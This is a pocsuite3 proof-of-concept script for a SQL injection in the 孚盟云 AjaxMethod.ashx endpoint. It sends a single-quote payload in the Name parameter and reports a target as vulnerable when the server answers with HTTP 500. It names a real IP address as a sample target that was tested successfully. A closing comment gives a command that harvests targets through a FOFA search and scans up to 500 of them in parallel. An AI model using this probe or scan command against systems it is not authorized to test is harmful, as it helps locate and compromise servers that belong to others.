from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "孚盟云 AjaxMethod.ashx SQL注入漏洞"#漏洞描述  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "XZ"  # PoC作者的大名
    vulDate = "2022-7-14"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-14"  # 编写 PoC 的日期
    updateDate = "2022-7-14"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/webapp/%E5%AD%9A%E7%9B%9F%E4%BA%91"]  # 漏洞地址来源,0day不用写
    name = "孚盟云 AjaxMethod.ashx SQL注入漏洞"  # PoC 名称
    appPowerLink = "http://wiki.peiqi.tech/wiki/webapp/%E5%AD%9A%E7%9B%9F%E4%BA%91"  # 漏洞厂商主页地址
    appName = "孚盟云 AjaxMethod.ashx SQL注入漏洞"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://123.56.232.112:9090"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
               孚盟云 AjaxMethod.ashx文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器权限

           """  # 漏洞简要描述
    pocDesc = """
               http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27

           """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        full_url = f"{self.url}/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27"
        cookies = {"ASP.NET_SessionId": "mnuq3vyve15020sj0n4i3eg0"}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        try:
            response = requests.get(full_url, headers=headers, cookies=cookies,allow_redirects=False, verify=False, timeout=5)
            # 判断是否存在漏洞
            if response.status_code == 500:
                result.append(self.url)
        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
#pocsuite -r ./pocs/3Ajax.py --dork-fofa  "title=""孚盟云 """" --max-size 500 --save-file ./3Ajax.txt --threads 505